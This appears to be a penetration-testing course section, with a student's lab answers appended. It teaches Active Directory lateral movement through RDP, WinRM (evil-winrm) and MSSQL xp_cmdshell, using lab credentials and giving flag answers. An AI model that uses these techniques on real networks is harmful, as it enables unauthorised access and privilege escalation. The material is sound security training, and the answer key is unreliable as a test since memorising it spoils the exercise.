# Privileged Access

Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.

`But what if we don't yet have local admin rights on any hosts in the domain?`

There are several other ways we can move around a Windows domain:

* `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
* [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
* `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods

We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:

* [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
* [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
* [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

We can also enumerate these privileges using tools such as PowerView and even built-in tools.

***

### Scenario Setup

In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portion of this section that requires interaction from a Linux host (`mssqlclient.py` and `evil-winrm`) you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`. We recommend that you try all methods shown in this section (i.e., `Enter-PSSession` and `PowerUpSQL` from the Windows attack host and `evil-winrm` and `mssqlclient.py` from the Linux attack host).

***

### Remote Desktop

Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to us as we could use the host position to:

* Launch further attacks
* We may be able to escalate privileges and obtain credentials for a higher privileged user
* We may be able to pillage the host for sensitive data or credentials

Using PowerView, we could use the [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) function to begin enumerating members of the `Remote Desktop Users` group on a given host. Let's check out the `Remote Desktop Users` group on the `MS01` host in our target domain.

**Enumerating the Remote Desktop Users Group**

Privileged Access

```powershell-session
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

From the information above, we can see that all Domain Users (meaning `all` users in the domain) can RDP to this host. It is common to see this on Remote Desktop Services (RDS) hosts or hosts used as jump hosts. This type of server could be heavily used, and we could potentially find sensitive data (such as credentials) that could be used to further our access, or we may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain. Typically the first thing I check after importing BloodHound data is:

Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?

**Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound**

![image](https://academy.hackthebox.com/storage/modules/143/bh\_RDP\_domain\_users.png)

If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

**Checking Remote Access Rights using BloodHound**

![image](https://academy.hackthebox.com/storage/modules/143/execution\_rights.png)

We could also check the `Analysis` tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`. There are other ways to enumerate this information, but BloodHound is a powerful tool that can help us narrow down these types of access rights quickly and accurately, which is hugely beneficial to us as penetration testers under time constraints for the assessment period. This can also be helpful for the blue team to periodically audit remote access rights across the environment and catch large-scale issues such as all Domain Users having unintended access to a host or audit rights for specific users/groups.

To test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or `mstsc.exe` if attacking from a Windows host.

***

### WinRM

Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access. We can again use the PowerView function `Get-NetLocalGroupMember` to the `Remote Management Users` group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.

**Enumerating the Remote Management Users Group**

Privileged Access

```powershell-session
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

Code: cypher

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

**Using the Cypher Query in BloodHound**

![image](https://academy.hackthebox.com/storage/modules/143/canpsremote\_bh\_cypherq.png)

We could also add this as a custom query to our BloodHound installation, so it's always available to us.

**Adding the Cypher Query as a Custom Query in BloodHound**

![image](https://academy.hackthebox.com/storage/modules/143/user\_defined\_query.png)

We can use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet using PowerShell from a Windows host.

**Establishing WinRM Session from Windows**

Privileged Access

```powershell-session
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-DB01
[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```

From our Linux attack host, we can use the tool [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect.

To use `evil-winrm` we can install it using the following command:

**Installing Evil-WinRM**

Privileged Access

```shell-session
AIceBear@htb[/htb]$ gem install evil-winrm
```

Typing `evil-winrm` will give us the help menu and all of the available commands.

**Viewing Evil-WinRM's Help Menu**

Privileged Access

```shell-session
AIceBear@htb[/htb]$ evil-winrm 

Evil-WinRM shell v3.3

Error: missing argument: ip, user

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```

We can connect with just an IP address and valid credentials.

**Connecting to a Target with Evil-WinRM and Valid Credentials**

Privileged Access

```shell-session
AIceBear@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend

Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

From here, we could dig around to plan our next move.

***

### SQL Server Admin

More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.

BloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:

Code: cypher

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Here we see one user, `damundsen` has `SQLAdmin` rights over the host `ACADEMY-EB-DB01`.

**Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound**

![image](https://academy.hackthebox.com/storage/modules/143/sqladmins\_bh.png)

We can use our ACL rights to authenticate with the `wley` user, change the password for the `damundsen` user and then authenticate with the target using a tool such as `PowerUpSQL`, which has a handy [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Let's assume we changed the account password to `SQL1234!` using our ACL rights. We can now authenticate and run operating system commands.

First, let's hunt for SQL server instances.

**Enumerating MSSQL Instances with PowerUpSQL**

Privileged Access

```powershell-session
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.

Privileged Access

```powershell-session
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.

**Displaying mssqlclient.py Options**

Privileged Access

```shell-session
AIceBear@htb[/htb]$ mssqlclient.py 

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                      target

TDS client implementation (SSL supported).

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

<SNIP>
```

**Running mssqlclient.py Against the Target**

Privileged Access

```shell-session
AIceBear@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

Once connected, we could type `help` to see what commands are available to us.

**Viewing our Options with Access to the SQL Server**

Privileged Access

```shell-session
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

We could then choose `enable_xp_cmdshell` to enable the [xp\_cmdshell stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.

**Choosing enable\_xp\_cmdshell**

Privileged Access

```shell-session
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal. These methods are covered in the `SeImpersonate and SeAssignPrimaryToken` of the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module. Try them out on this target if you would like to practice further!

**Enumerating our Rights on the System using xp\_cmdshell**

Privileged Access

```shell-session
xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL                                                               
```

***

### Moving On

This section demonstrated a few possible lateral movement techniques in an Active Directory environment. We should always look for these types of rights when we gain our initial foothold and gain control of additional user accounts. Remember that enumerating and attacking is an iterative process! Every time we gain control over another user/host, we should repeat some enumeration steps to see what, if any, new rights and privileges we have obtained. Never overlook remote access rights if the user is not a local admin on the target host because we could very likely get onto a host where we find sensitive data, or we're able to escalate privileges.

Finally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed `SYSTEM` access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous `SeImpersonatePrivilege` right.

The following section will address a common issue we often run into when using WinRM to connect to hosts in the network.

## **Questions**

### What other user in the domain has CanPSRemote rights to a host?

```bash
xfreerdp /v:10.129.228.68 /u:htb-student /p:'Academy_student_AD!' /cert-ignore /dynamic-resolution
```

now go to powershell

```powershell
cd C:\Tools
Import-Module ActiveDirectory
Get-Module
.\SharpHound.exe -c All --zipfilename ILFREIGHT
cd C:\Tools\BloodHound-GUI
.\BloodHound.exe
#upload ILFREIGHT zip file in bloodhound
```

now add this RAW query

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

bdavis

### What host can this user access via WinRM? (just the computer name)

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

ACADEMY-EA-DC01

### Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt

```bash
xfreerdp /v:10.129.230.228 /u:damundsen /p:'SQL1234!' /cert-ignore
```

go to admin powershell then ssh into linux box

```powershell
ssh htb-student@172.16.5.225  #HTB_@cademy_stdnt!
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth #SQL1234!
```

now inside SQL

```sql
enable_xp_cmdshell
xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
#1m_the_sQl_@dm1n_n0w!
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
